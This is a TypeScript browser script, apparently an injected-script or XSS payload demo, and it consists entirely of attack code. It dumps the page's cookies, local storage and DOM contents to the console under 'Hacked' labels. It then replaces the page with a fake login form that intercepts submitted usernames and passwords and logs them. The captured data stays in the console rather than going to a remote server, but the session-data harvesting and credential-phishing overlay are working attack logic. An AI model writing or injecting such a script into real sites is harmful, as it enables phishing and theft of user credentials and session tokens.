// Log cookies, local storage, and DOM contents
console.log(`%cHacked Cookies: %c${document.cookie}`, 'color: red', 'color: white');
console.log(`%cHacked Local Storage: %c${JSON.stringify(localStorage)}`, 'color: red', 'color: white');
console.log(`%cHacked DOM Contents: %c${document.documentElement.innerHTML}`, 'color: red', 'color: white');

// Create a fake login page
const fakeLoginPage = `
  <style>
    /* ...some CSS to style the login page... */
  </style>
  <form id="fakeLoginForm">
    <input type="text" name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Login</button>
  </form>
`;

document.documentElement.innerHTML = fakeLoginPage;

// Get the form element with type casting
const form = document.getElementById('fakeLoginForm') as HTMLFormElement;

// Log form submissions to the console
form.addEventListener('submit', (event: Event) => {
  event.preventDefault();

  const usernameInput = form.elements.namedItem('username') as HTMLInputElement;
  const passwordInput = form.elements.namedItem('password') as HTMLInputElement;

  const username = usernameInput.value;
  const password = passwordInput.value;

  console.log(`%cHacked Username: %c${username}`, 'color: red', 'color: white');
  console.log(`%cHacked Password: %c${password}`, 'color: red', 'color: white');
});
